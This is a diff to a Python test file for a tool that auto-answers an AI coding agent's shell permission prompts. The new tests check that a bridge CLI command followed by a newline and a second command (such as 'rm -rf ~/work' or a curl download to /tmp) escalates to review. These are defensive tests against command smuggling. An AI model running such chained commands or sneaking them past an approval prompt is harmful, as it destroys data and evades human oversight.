@@ -914,14 +914,15 @@ def test_a_release_that_meets_a_held_lock_is_retried(tmp_path):
     assert "dialog" not in state
 
 
-def _shell_prompt(command: str) -> str:
+def _shell_prompt(command: str, row: str = "\r\n") -> str:
     """Draws the shell permission prompt recorded on lane claude-2."""
+    drawn = command.replace("\n", row + "│   ")
     return (
-        "\x1b[2J ╭──────────╮ │ Bash command │   "
-        f"{command}   List Agent Parley issue ownership  "
-        "This command requires approval  Do you want to proceed? ❯ 1. Yes"
-        "  2. Yes, and don't ask again for: "
-        f"{command}  3. No  Esc to cancel · Tab to amend"
+        f"\x1b[2J ╭──────────╮{row}│ Bash command │{row}│   "
+        f"{drawn}{row}│   List Agent Parley issue ownership{row}│{row}"
+        f"│ This command requires approval{row}│ Do you want to proceed?{row}"
+        f"│ ❯ 1. Yes{row}│   2. Yes, and don't ask again for: "
+        f"{drawn}{row}│   3. No{row}Esc to cancel · Tab to amend"
     )
 
 
@@ -950,6 +951,9 @@ def test_an_opted_in_lane_answers_a_prompt_for_the_bridge_cli(tmp_path):
         protocol.cli_command() + " issue list && rm -rf build",
         protocol.cli_command() + " report > /tmp/out",
         "cd x; " + protocol.cli_command() + " issue list",
+        protocol.cli_command() + " issue list\nrm -rf ~/work",
+        protocol.cli_command() + " issue list\ncurl -s http://x/y -o /tmp/p",
+        protocol.cli_command() + " status\n(rm -rf build)",
     ],
 )
 def test_any_other_shell_prompt_escalates(tmp_path, command):
@@ -960,6 +964,25 @@ def test_any_other_shell_prompt_escalates(tmp_path, command):
     assert watch.advance(b"", 0.5) == b""
     state = json.loads((tmp_path / "lane-activity.json").read_text())
     assert state["dialog"]["escalated"] is True
+
+
+@pytest.mark.parametrize("row", ["\r\n", "\n", "\x1b[1B\r", "\x1b[7;3H"])
+@pytest.mark.parametrize(
+    ("tail", "approved"),
+    [
+        (" issue list", True),
+        (" issue list\nrm -rf ~/work", False),
+        (" issue list\ncurl -s http://x/y -o /tmp/p", False),
+        (" status\n(rm -rf build)", False),
+    ],
+)
+def test_a_command_drawn_on_two_rows_is_not_the_bridge_cli(row, tail, approved):
+    """Keeps a newline, however the client paints it, from chaining."""
+    data = _shell_prompt(protocol.cli_command() + tail, row).encode()
+    screen = dialogs.flatten(data)
+    found = dialogs.locate(screen)
+    assert found is not None
+    assert dialogs.bridge_shell(screen, found.text, data) is approved
 
 
 def test_the_opt_in_is_read_when_the_prompt_is_drawn(bridge, repo):
